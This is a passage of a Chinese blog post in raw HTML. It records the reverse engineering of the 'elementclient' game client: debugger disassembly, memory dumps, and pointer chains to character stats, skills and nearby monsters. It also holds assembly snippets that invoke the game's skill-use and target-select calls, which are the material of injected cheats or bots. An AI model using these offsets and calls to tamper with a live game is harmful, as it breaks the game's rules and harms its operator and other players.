class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">009AD0A0 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B32816 - 89 86 04090000  - mov [esi+00000904],eax</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">009AD0A0              | 89B0 04090000          | mov dword ptr ds:[eax+904],esi                 |</span><br><span class=\"line\">009AD0A6              | 8D45 F8                | lea eax,dword ptr ss:[ebp-8]                   |</span><br><span class=\"line\">009AD0A9              | 50                     | push eax                                       |</span><br><span class=\"line\">009AD0AA              | 8D45 08                | lea eax,dword ptr ss:[ebp+8]                   |</span><br><span class=\"line\">009AD0AD              | 50                     | push eax                                       |</span><br><span class=\"line\">009AD0AE              | E8 0D070000            | call elementclient.9AD7C0                      |</span><br><span class=\"line\"></span><br><span class=\"line\">00B551C2              | A1 38EE4F01            | mov eax,dword ptr ds:[14FEE38]                 | 015084F8</span><br><span class=\"line\">00B551C7              | 56                     | push esi                                       | 80001A0B</span><br><span class=\"line\">00B551C8              | 8B48 20                | mov ecx,dword ptr ds:[eax+20]                  | 1D01F028</span><br><span class=\"line\">00B551CB              | 81C1 EC000000          | add ecx,EC                                     |</span><br><span class=\"line\">00B551D1              | E8 9A7EE5FF            | call elementclient.9AD070                      |</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[14FEE38]      </span><br><span class=\"line\">push 80001A0B</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+20]</span><br><span class=\"line\">add ecx,0x0EC           </span><br><span class=\"line\">call 9AD070</span><br></pre></td></tr></table></figure>\n<p>人物技能分析</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">00CE9EEE              | FF70 08                | push dword ptr ds:[eax+8]                      |</span><br><span class=\"line\"></span><br><span class=\"line\">回城术 A7</span><br><span class=\"line\">458AB5E0</span><br><span class=\"line\"></span><br><span class=\"line\">清心咒 71</span><br><span class=\"line\">493BCA60</span><br><span class=\"line\"></span><br><span class=\"line\">羽剑 7D</span><br><span class=\"line\">458AB880</span><br><span class=\"line\"></span><br><span class=\"line\">龙卷风 7F</span><br><span class=\"line\">4589E0D0</span><br><span class=\"line\"></span><br><span class=\"line\">静心咒 72</span><br><span class=\"line\">458AB6F8</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">3D82F288 493BCA60 `Ê;I   </span><br><span class=\"line\">3D82F28C 458AB6F8 ø¶.E   </span><br><span class=\"line\">3D82F290 458AB880 .¸.E   </span><br><span class=\"line\">3D82F294 4589E0D0 Ðà.E   </span><br><span class=\"line\">3D82F298 458AB5E0 àµ.E   </span><br><span class=\"line\"></span><br><span class=\"line\">493BCA60 01297268 hr). </span><br><span class=\"line\">493BCA64 2E164EA8 ¨N.. </span><br><span class=\"line\">493BCA68 00000071 q... </span><br><span class=\"line\">493BCA6C 00000005 .... </span><br><span class=\"line\"></span><br><span class=\"line\">2E164EA8 1046C5DC ÜÅF. </span><br><span class=\"line\">2E164EAC 10830198 .... </span><br><span class=\"line\">2E164EB0 00000000 .... </span><br><span class=\"line\">2E164EB4 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">10830198 10542A90 .*T. elementskill.&amp;?GetRequiredGenius@ElementSkill@GNET@@UAEPAHH@Z</span><br><span class=\"line\">1083019C 00000071 q... </span><br><span class=\"line\">108301A0 00000007 .... </span><br><span class=\"line\">108301A4 10542AE8 è*T. L&quot;清心咒&quot;</span><br><span class=\"line\">108301A8 10542AF0 ð*T. &quot;清心咒&quot;</span><br><span class=\"line\">108301AC 10542AF8 ø*T. &quot;清心咒.dds&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">10542AE8 5FC36E05 .nÃ_ </span><br><span class=\"line\">10542AEC 00005492 .T.. </span><br><span class=\"line\">10542AF0 C4D0E5C7 ÇåÐÄ </span><br><span class=\"line\">10542AF4 0000E4D6 Öä.. </span><br><span class=\"line\">10542AF8 C4D0E5C7 ÇåÐÄ </span><br><span class=\"line\"></span><br><span class=\"line\">[[[[3D82F288]+4]+4]+0x0C]</span><br></pre></td></tr></table></figure>\n<p><img data-src=\"https://kbshire-1308981697.cos.ap-shanghai.myqcloud.com/img/image-20230105204555127.png\" alt=\"image-20230105204555127\"></p>\n<p>5E5D69F8 - 5E5D41D8 = 2820</p>\n<p>人物 this 指针 + 2820 就是技能数组的首地址，通过技能数组的首地址可以找到技能的全部信息</p>\n<h4 id=\"更新结束\"><a class=\"markdownIt-Anchor\" href=\"#更新结束\">#</a> 更新结束</h4>\n<h4 id=\"更新2023111\"><a class=\"markdownIt-Anchor\" href=\"#更新2023111\">#</a> 更新 2023.1.11</h4>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br><span class=\"line\">129</span><br><span class=\"line\">130</span><br><span class=\"line\">131</span><br><span class=\"line\">132</span><br><span class=\"line\">133</span><br><span class=\"line\">134</span><br><span class=\"line\">135</span><br><span class=\"line\">136</span><br><span class=\"line\">137</span><br><span class=\"line\">138</span><br><span class=\"line\">139</span><br><span class=\"line\">140</span><br><span class=\"line\">141</span><br><span class=\"line\">142</span><br><span class=\"line\">143</span><br><span class=\"line\">144</span><br><span class=\"line\">145</span><br><span class=\"line\">146</span><br><span class=\"line\">147</span><br><span class=\"line\">148</span><br><span class=\"line\">149</span><br><span class=\"line\">150</span><br><span class=\"line\">151</span><br><span class=\"line\">152</span><br><span class=\"line\">153</span><br><span class=\"line\">154</span><br><span class=\"line\">155</span><br><span class=\"line\">156</span><br><span class=\"line\">157</span><br><span class=\"line\">158</span><br><span class=\"line\">159</span><br><span class=\"line\">160</span><br><span class=\"line\">161</span><br><span class=\"line\">162</span><br><span class=\"line\">163</span><br><span class=\"line\">164</span><br><span class=\"line\">165</span><br><span class=\"line\">166</span><br><span class=\"line\">167</span><br><span class=\"line\">168</span><br><span class=\"line\">169</span><br><span class=\"line\">170</span><br><span class=\"line\">171</span><br><span class=\"line\">172</span><br><span class=\"line\">173</span><br><span class=\"line\">174</span><br><span class=\"line\">175</span><br><span class=\"line\">176</span><br><span class=\"line\">177</span><br><span class=\"line\">178</span><br><span class=\"line\">179</span><br><span class=\"line\">180</span><br><span class=\"line\">181</span><br><span class=\"line\">182</span><br><span class=\"line\">183</span><br><span class=\"line\">184</span><br><span class=\"line\">185</span><br><span class=\"line\">186</span><br><span class=\"line\">187</span><br><span class=\"line\">188</span><br><span class=\"line\">189</span><br><span class=\"line\">190</span><br><span class=\"line\">191</span><br><span class=\"line\">192</span><br><span class=\"line\">193</span><br><span class=\"line\">194</span><br><span class=\"line\">195</span><br><span class=\"line\">196</span><br><span class=\"line\">197</span><br><span class=\"line\">198</span><br><span class=\"line\">199</span><br><span class=\"line\">200</span><br><span class=\"line\">201</span><br><span class=\"line\">202</span><br><span class=\"line\">203</span><br><span class=\"line\">204</span><br><span class=\"line\">205</span><br><span class=\"line\">206</span><br><span class=\"line\">207</span><br><span class=\"line\">208</span><br><span class=\"line\">209</span><br><span class=\"line\">210</span><br><span class=\"line\">211</span><br><span class=\"line\">212</span><br><span class=\"line\">213</span><br><span class=\"line\">214</span><br><span class=\"line\">215</span><br><span class=\"line\">216</span><br><span class=\"line\">217</span><br><span class=\"line\">218</span><br><span class=\"line\">219</span><br><span class=\"line\">220</span><br><span class=\"line\">221</span><br><span class=\"line\">222</span><br><span class=\"line\">223</span><br><span class=\"line\">224</span><br><span class=\"line\">225</span><br><span class=\"line\">226</span><br><span class=\"line\">227</span><br><span class=\"line\">228</span><br><span class=\"line\">229</span><br><span class=\"line\">230</span><br><span class=\"line\">231</span><br><span class=\"line\">232</span><br><span class=\"line\">233</span><br><span class=\"line\">234</span><br><span class=\"line\">235</span><br><span class=\"line\">236</span><br><span class=\"line\">237</span><br><span class=\"line\">238</span><br><span class=\"line\">239</span><br><span class=\"line\">240</span><br><span class=\"line\">241</span><br><span class=\"line\">242</span><br><span class=\"line\">243</span><br><span class=\"line\">244</span><br><span class=\"line\">245</span><br><span class=\"line\">246</span><br><span class=\"line\">247</span><br><span class=\"line\">248</span><br><span class=\"line\">249</span><br><span class=\"line\">250</span><br><span class=\"line\">251</span><br><span class=\"line\">252</span><br><span class=\"line\">253</span><br><span class=\"line\">254</span><br><span class=\"line\">255</span><br><span class=\"line\">256</span><br><span class=\"line\">257</span><br><span class=\"line\">258</span><br><span class=\"line\">259</span><br><span class=\"line\">260</span><br><span class=\"line\">261</span><br><span class=\"line\">262</span><br><span class=\"line\">263</span><br><span class=\"line\">264</span><br><span class=\"line\">265</span><br><span class=\"line\">266</span><br><span class=\"line\">267</span><br><span class=\"line\">268</span><br><span class=\"line\">269</span><br><span class=\"line\">270</span><br><span class=\"line\">271</span><br><span class=\"line\">272</span><br><span class=\"line\">273</span><br><span class=\"line\">274</span><br><span class=\"line\">275</span><br><span class=\"line\">276</span><br><span class=\"line\">277</span><br><span class=\"line\">278</span><br><span class=\"line\">279</span><br><span class=\"line\">280</span><br><span class=\"line\">281</span><br><span class=\"line\">282</span><br><span class=\"line\">283</span><br><span class=\"line\">284</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">1.人物this指针</span><br><span class=\"line\">00B2ECD5 - 89 86 8C070000  - mov [esi+0000078C],eax</span><br><span class=\"line\">当前血量 = [esi + 78C]    esi = 5EB45680</span><br><span class=\"line\"></span><br><span class=\"line\">00B2EBB7             | 8BF1                  | mov esi,ecx                           |</span><br><span class=\"line\">当前血量 = [ecx + 78C]    ecx = 5EB45680</span><br><span class=\"line\"></span><br><span class=\"line\">00B391E2             | E8 C959FFFF           | call elementclient.B2EBB0             |</span><br><span class=\"line\"></span><br><span class=\"line\">00BF23C8             | FF52 68               | call dword ptr ds:[edx+68]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00BF23C4             | 8BC8                  | mov ecx,eax                           |</span><br><span class=\"line\">当前血量 = [eax + 78C]    eax = 5EB45680</span><br><span class=\"line\"></span><br><span class=\"line\">00BF0540             | 8B41 08               | mov eax,dword ptr ds:[ecx+8]          |</span><br><span class=\"line\">00BF0543             | 8B40 30               | mov eax,dword ptr ds:[eax+30]         |</span><br><span class=\"line\">当前血量 = [[[ecx+8]+30] + 78C]     ecx = 0648E5A0</span><br><span class=\"line\"></span><br><span class=\"line\">00BE5869             | FF50 34               | call dword ptr ds:[eax+34]            |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B8AE             | E8 4D9F1900           | call elementclient.BE5800             |</span><br><span class=\"line\"></span><br><span class=\"line\">00A4B89A             | 8B4F 30               | mov ecx,dword ptr ds:[edi+30]         |</span><br><span class=\"line\">当前血量 = [[[0150B6FC]+30] + 78C]</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 78C 为血量</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E4 为血量上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 790 为真气</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7E8 为真气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 784 为等级</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 794 为经验</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 798 为元神</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 79C 为元气上限</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 7A0 为真元</span><br><span class=\"line\"></span><br><span class=\"line\">$ + B00 / $ + B04 为角色姓名</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 864 为最大真元</span><br><span class=\"line\"></span><br><span class=\"line\">$ + 930 为银币</span><br><span class=\"line\"></span><br><span class=\"line\">$ +7A0/864+8FC  为  99/100</span><br><span class=\"line\"> </span><br><span class=\"line\"></span><br><span class=\"line\">2.人物技能call</span><br><span class=\"line\">009ADDF5             | FF75 14               | push dword ptr ss:[ebp+14]            | 0019EE7C</span><br><span class=\"line\">009ADDF8             | C701 00000000         | mov dword ptr ds:[ecx],0              | [1DC7CDB8]</span><br><span class=\"line\">009ADDFE             | FF75 10               | push dword ptr ss:[ebp+10]            | 1 </span><br><span class=\"line\">009ADE01             | FF75 0C               | push dword ptr ss:[ebp+C]             | 01518200</span><br><span class=\"line\">009ADE04             | FF75 08               | push dword ptr ss:[ebp+8]             | 0000007D</span><br><span class=\"line\">009ADE07             | E8 84803100           | call elementclient.CC5E90             |</span><br><span class=\"line\"></span><br><span class=\"line\">00B43CB2             | 50                    | push eax                              | 0019EE7C</span><br><span class=\"line\">00B43CB3             | 8B87 00280000         | mov eax,dword ptr ds:[edi+2800]       | 43336E60</span><br><span class=\"line\">00B43CB9             | 6A 01                 | push 1                                | 1</span><br><span class=\"line\">00B43CBB             | FF75 C8               | push dword ptr ss:[ebp-38]            | 181E4F00</span><br><span class=\"line\">00B43CBE             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00B43CC1             | A1 20205001           | mov eax,dword ptr ds:[1502020]        | 0150B6E0</span><br><span class=\"line\">00B43CC6             | 8B48 20               | mov ecx,dword ptr ds:[eax+20]         | 1DEB6028</span><br><span class=\"line\">00B43CC9             | 81C1 EC000000         | add ecx,EC                            | </span><br><span class=\"line\">00B43CCF             | E8 ECA0E6FF           | call elementclient.9ADDC0             |</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">00CEB35C - 8B 43 08  - mov eax,[ebx+08]</span><br><span class=\"line\">00CEB35C             | 8B43 08               | mov eax,dword ptr ds:[ebx+8]          | 43336E60</span><br><span class=\"line\">00CEB35F             | 8B11                  | mov edx,dword ptr ds:[ecx]            | 012787BC</span><br><span class=\"line\">00CEB361             | 6A FF                 | push FFFFFFFF                         |</span><br><span class=\"line\">00CEB363             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB365             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB367             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00CEB36A             | 8B42 0C               | mov eax,dword ptr ds:[edx+C]          | 0096B5A0</span><br><span class=\"line\">00CEB36D             | FFD0                  | call eax                              |</span><br><span class=\"line\"></span><br><span class=\"line\">00CEB373 - 8B 43 08  - mov eax,[ebx+08]</span><br><span class=\"line\">00CEB373             | 8B43 08               | mov eax,dword ptr ds:[ebx+8]          | 43336E60</span><br><span class=\"line\">00CEB376             | 8BCE                  | mov ecx,esi                           | 5EB45680</span><br><span class=\"line\">00CEB378             | 6A FF                 | push FFFFFFFF                         |</span><br><span class=\"line\">00CEB37A             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB37C             | 6A 00                 | push 0                                |</span><br><span class=\"line\">00CEB37E             | FF70 08               | push dword ptr ds:[eax+8]             | 0000007D</span><br><span class=\"line\">00CEB381             | E8 FA38E5FF           | call elementclient.B3EC80             |</span><br><span class=\"line\"></span><br><span class=\"line\">00CEB2D7             | 8B70 30               | mov esi,dword ptr ds:[eax+30]         |</span><br><span class=\"line\">esi = [eax + 30]</span><br><span class=\"line\">00CEB2D4             | 8B40 1C               | mov eax,dword ptr ds:[eax+1C]         |</span><br><span class=\"line\">esi = [[eax+1C] + 30]</span><br><span class=\"line\">00CEB2CA             | A1 20205001           | mov eax,dword ptr ds:[1502020]        |</span><br><span class=\"line\">esi = [[[1502020] + 1C] + 30]</span><br><span class=\"line\"></span><br><span class=\"line\">mov ecx,1502020</span><br><span class=\"line\">mov ecx,[ecx]</span><br><span class=\"line\">mov ecx,[ecx+1C]</span><br><span class=\"line\">mov ecx,[ecx+30]</span><br><span class=\"line\">push  -1</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 0</span><br><span class=\"line\">push 7D</span><br><span class=\"line\">call 0x0B3EC80</span><br><span class=\"line\"></span><br><span class=\"line\">3.人物选中call</span><br><span class=\"line\">009AE200 - 89 B0 04090000  - mov [eax+00000904],esi</span><br><span class=\"line\">00B55402             | A1 20205001           | mov eax,dword ptr ds:[1502020]        |</span><br><span class=\"line\">00B55407             | 56                    | push esi                              | 80001A0B</span><br><span class=\"line\">00B55408             | 8B48 20               | mov ecx,dword ptr ds:[eax+20]         |</span><br><span class=\"line\">00B5540B             | 81C1 EC000000         | add ecx,EC                            |</span><br><span class=\"line\">00B55411             | E8 BA8DE5FF           | call elementclient.9AE1D0             |</span><br><span class=\"line\"></span><br><span class=\"line\">mov eax,dword ptr ds:[1502020]</span><br><span class=\"line\">push 80001C4A</span><br><span class=\"line\">mov ecx,dword ptr ds:[eax+20] </span><br><span class=\"line\">add ecx,0x0EC        </span><br><span class=\"line\">call 9AE1D0     </span><br><span class=\"line\"></span><br><span class=\"line\">//通过寻找上一层的代码确定call</span><br><span class=\"line\"></span><br><span class=\"line\">4.人物技能分析</span><br><span class=\"line\">00CEB37E             | FF70 08               | push dword ptr ds:[eax+8]             |</span><br><span class=\"line\">eax = 4483FFB0</span><br><span class=\"line\"></span><br><span class=\"line\">41930A50  47B991C0 À.¹G </span><br><span class=\"line\">41930A54  4483FE28 (þ.D </span><br><span class=\"line\">41930A58  4483FFB0 °ÿ.D </span><br><span class=\"line\">41930A5C  44832800 .(.D </span><br><span class=\"line\">41930A60  4483FD10 .ý.D </span><br><span class=\"line\"></span><br><span class=\"line\">47B991C0 01299498 ..). </span><br><span class=\"line\">47B991C4 30F749F0 ðI÷0 </span><br><span class=\"line\">47B991C8 00000071 q... </span><br><span class=\"line\">47B991CC 00000005 .... </span><br><span class=\"line\">47B991D0 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">30F749F0 1046E60C .æF. </span><br><span class=\"line\">30F749F4 10833F48 H?.. </span><br><span class=\"line\">30F749F8 00000000 .... </span><br><span class=\"line\">30F749FC 00000000 .... </span><br><span class=\"line\"></span><br><span class=\"line\">10833F48 105450F8 øPT. elementskill.&amp;?GetRequiredGenius@ElementSkill@GNET@@UAEPAHH@Z</span><br><span class=\"line\">10833F4C 00000071 q... </span><br><span class=\"line\">10833F50 00000007 .... </span><br><span class=\"line\">10833F54 10545150 PQT. L&quot;清心咒&quot;</span><br><span class=\"line\">10833F58 10545158 XQT. &quot;清心咒&quot;</span><br><span class=\"line\">10833F5C 10545160 `QT. &quot;清心咒.dds&quot;</span><br><span class=\"line\"></span><br><span class=\"line\">10545150 清心咒</span><br><span class=\"line\"></span><br><span class=\"line\">2CAC0CF8 - [[[0150B6FC]+30] = 2CAC0CF8 - 2CABE4D8 = 2820</span><br><span class=\"line\">[[[0150B6FC]+30]+2820]   //即可得到技能列表首地址</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">5.周围怪物列表</span><br><span class=\"line\">00BE8626 - 89 88 2C010000  - mov [eax+0000012C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">00BE8615   &gt; \\8B72 0C       mov esi,dword ptr ds:[edx+0xC]           ;  Case 21 of switch 00BE84E0</span><br><span class=\"line\">00BE8618   .  FF36          push dword ptr ds:[esi]       </span><br><span class=\"line\">00BE861A   .  E8 F10D0000   call ElementC.00BE9410</span><br><span class=\"line\">00BE861F   .  85C0          test eax,eax</span><br><span class=\"line\">00BE8621   .  74 60         je XElementC.00BE8683</span><br><span class=\"line\">00BE8623   .  8B4E 04       mov ecx,dword ptr ds:[esi+0x4]</span><br><span class=\"line\">00BE8626   .  8988 2C010000 mov dword ptr ds:[eax+0x12C],ecx</span><br><span class=\"line\">00BE862C   .  8B4E 08       mov ecx,dword ptr ds:[esi+0x8]</span><br><span class=\"line\">00BE862F   .  8988 84010000 mov dword ptr ds:[eax+0x184],ecx</span><br><span class=\"line\">00BE8635   .  8B4E 0C       mov ecx,dword ptr ds:[esi+0xC]</span><br><span class=\"line\">00BE8638   .  5F            pop edi</span><br><span class=\"line\">00BE8639   .  5E            pop esi</span><br><span class=\"line\">00BE863A   .  8988 0C020000 mov dword ptr ds:[eax+0x20C],ecx</span><br><span class=\"line\"></span><br><span class=\"line\">00BF4E10   $  55            push ebp</span><br><span class=\"line\">00BF4E11   .  8BEC          mov ebp,esp</span><br><span class=\"line\">00BF4E13   .  8B45 0C       mov eax,dword ptr ss:[ebp+0xC]</span><br><span class=\"line\">00BF4E16   .  33D2          xor edx,edx</span><br><span class=\"line\">00BF4E18   .  56            push esi</span><br><span class=\"line\">00BF4E19   .  8B30          mov esi,dword ptr ds:[eax]     80001C4A</span><br><span class=\"line\">00BF4E1B   .  8BC6          mov eax,esi</span><br><span class=\"line\">00BF4E1D   .  F771 14       div dword ptr ds:[ecx+0x14]    ecx = 0A345DEC</span><br><span class=\"line\">00BF4E20   .  8B41 08       mov eax,dword ptr ds:[ecx+0x8]    51A10448</span><br><span class=\"line\">00BF4E23   .  8B0490        mov eax,dword ptr ds:[eax+edx*4]  41AEC578 edx=000002CB</span><br><span class=\"line\">00BF4E26   .  85C0          test eax,eax</span><br><span class=\"line\"></span><br><span class=\"line\">00BE9421  |.  8D4E 14       lea ecx,dword ptr ds:[esi+0x14]</span><br><span class=\"line\">ecx = [esi+0x14] = [ecx + 0x14] = [[eax+2*4+0x1C] + 0x14] = [[[[esi+0x4]+0x1C]+2*4+0x1C] + 0x14] = [[[[ecx+0x4]+0x1C]+2*4+0x1C] + 0x14] = [[[[[0150B6FC]+0x98]+0x4]+0x1C]+2*4+0x1C] + 0x14</span><br><span class=\"line\"></span><br><span class=\"line\">eax = [eax+edx*4] = 41AEC578</span><br><span class=\"line\"></span><br><span class=\"line\">41AEC578  00000000</span><br><span class=\"line\">41AEC57C  2D9E78D0</span><br><span class=\"line\">41AEC580  80001C4A</span><br><span class=\"line\"></span><br><span class=\"line\">2D9E78D0  01282E8C  ElementC.01282E8C</span><br><span class=\"line\">2D9E78D4  00000012</span><br><span class=\"line\">2D9E78D8  01518328  ElementC.01518328</span><br><span class=\"line\">2D9E78DC  3F7F4E6D</span><br><span class=\"line\">2D9E78E0  80000000</span><br><span class=\"line\">2D9E78E4  3D96A916</span><br><span class=\"line\">2D9E78E8  00000000</span><br><span class=\"line\">2D9E78EC  00000000</span><br><span class=\"line\">2D9E78F0  3F800000</span><br><span class=\"line\">2D9E78F4  00000000</span><br><span class=\"line\">2D9E78F8  00000000</span><br><span class=\"line\">2D9E78FC  BD96A917</span><br><span class=\"line\">2D9E7900  00000000</span><br><span class=\"line\">2D9E7904  3F7F4E6F</span><br><span class=\"line\">2D9E7908  00000000</span><br><span class=\"line\">2D9E790C  44339366</span><br><span class=\"line\">2D9E7910  42855E22</span><br><span class=\"line\">2D9E7914  C2B205F5</span><br><span class=\"line\">2D9E7918  3F800000</span><br><span class=\"line\">2D9E791C  3F7F4E6D</span><br><span class=\"line\">2D9E7920  80000000</span><br><span class=\"line\">2D9E7924  3D96A916</span><br><span class=\"line\">2D9E7928  00000000</span><br><span class=\"line\">2D9E792C  00000000</span><br><span class=\"line\">2D9E7930  3F800000</span><br><span class=\"line\">2D9E7934  00000000</span><br><span class=\"line\">2D9E7938  00000000</span><br><span class=\"line\">2D9E793C  BD96A917</span><br><span class=\"line\">2D9E7940  00000000</span><br><span class=\"line\">2D9E7944  3F7F4E6F</span><br><span class=\"line\">2D9E7948  00000000</span><br><span class=\"line\">2D9E794C  44339366</span><br><span class=\"line\">2D9E7950  42855E22</span><br><span class=\"line\">2D9E7954  C2B205F5</span><br><span class=\"line\">2D9E7958  3F800000</span><br><span class=\"line\">2D9E795C  00000000</span><br><span class=\"line\">2D9E7960  00000000</span><br><span class=\"line\">2D9E7964  012BC8F8  ElementC.012BC8F8</span><br><span class=\"line\">2D9E7968  01248974  ElementC.01248974</span><br><span class=\"line\">2D9E797C  0000000A</span><br><span class=\"line\">2D9E7980  00000000</span><br><span class=\"line\">2D9E7984  00000006</span><br><span class=\"line\">2D9E7988  420136DA</span><br><span class=\"line\">2D9E798C  75490100  windows_.75490100</span><br><span class=\"line\">2D9E7990  00000000</span><br><span class=\"line\">2D9E7994  BD471982</span><br><span class=\"line\">2D9E7998  80000000</span><br><span class=\"line\">2D9E799C  3F7FB288</span><br><span class=\"line\">2D9E79A0  00000000</span><br><span class=\"line\">2D9E79A4  BD16C33D</span><br><span class=\"line\">2D9E79A8  80000000</span><br><span class=\"line\">2D9E79AC  3F7FD398</span><br><span class=\"line\">2D9E79B0  00000096</span><br><span class=\"line\">2D9E79B4  0000009C</span><br><span class=\"line\">2D9E79B8  0000000F</span><br><span class=\"line\">2D9E79BC  77000100  gdi32ful.77000100</span><br><span class=\"line\">2D9E79C0  BDC16CBC</span><br><span class=\"line\">2D9E79C4  3F77956C</span><br><span 